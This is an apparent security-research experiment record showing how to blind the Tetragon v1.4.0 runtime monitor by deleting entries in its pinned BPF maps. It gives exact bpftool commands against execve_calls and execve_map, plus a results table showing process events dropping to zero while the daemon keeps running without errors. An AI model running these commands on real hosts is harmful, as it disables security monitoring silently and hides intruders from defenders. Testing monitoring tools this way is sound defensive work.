# Experiment: Tetragon v1.4.0 Total Blindness

## Objective

Verify that deleting `execve_calls` prog_array entries and clearing `execve_map` causes complete Tetragon blindness.

## Setup

```bash
docker run -d --name tetragon-test \
  --privileged --pid=host \
  -v /sys/kernel/btf:/sys/kernel/btf:ro \
  -v /sys/kernel/debug:/sys/kernel/debug \
  -v /sys/fs/bpf:/sys/fs/bpf \
  -v /lib/modules:/lib/modules:ro \
  quay.io/cilium/tetragon:v1.4.0
```

## Variables

- **Independent variables:**
  - `execve_calls` prog_array entries (present vs deleted)
  - `execve_map` entries (populated vs empty)
- **Dependent variable:** Number of events reported by Tetragon
- **Measurement:** `tetra getevents -o json` via gRPC

## Procedure

1. Wait 15s for Tetragon initialization
2. Verify pinned maps at `/sys/fs/bpf/tetragon/`
3. Record baseline: capture events via `tetra getevents` for 5s, generate activity
4. Poison step 1: delete `execve_calls` entries (keys 0 and 1)
5. Poison step 2: clear all entries from `execve_map`
6. Record post-poison: capture events for 5s, generate same activity
7. Restore: restart container
8. Record post-restore: capture events for 5s

## Attack Details

### execve_calls Deletion

```bash
bpftool map delete pinned /sys/fs/bpf/tetragon/__base__/event_execve/execve_calls key hex 00 00 00 00
bpftool map delete pinned /sys/fs/bpf/tetragon/__base__/event_execve/execve_calls key hex 01 00 00 00
```

### execve_map Clear

```bash
# Enumerate and delete all ~192 entries
bpftool map dump pinned /sys/fs/bpf/tetragon/execve_map -j | python3 -c "[delete each]"
```

## Results

| Phase | process_exec | process_exit | Total Events |
|-------|-------------|-------------|--------------|
| Baseline | **14** | 13+ | 15+ |
| After execve_calls deletion only | **0** | 13 | 13 |
| After execve_map clear | **0** | **0** | **0** |
| After restore (restart) | **11** | 11+ | 11+ |

## Observations

- Deleting execve_calls entries eliminates all process_exec events (tail call failure is silent)
- process_exit events continue because exit handler is a separate kprobe (not using execve_calls)
- Clearing execve_map additionally eliminates exit events (exit handler looks up PID in execve_map)
- Combined attack achieves total blindness
- All maps are pinned — no enumeration needed, paths are predictable
- Tetragon userspace daemon continues running (no crash, no error logs)
- Recovery requires container restart (maps are repopulated on init)

## Conclusion

Confirmed: Tetragon's exclusive reliance on pinned BPF maps with predictable filesystem paths makes it the easiest target for BPF map poisoning.
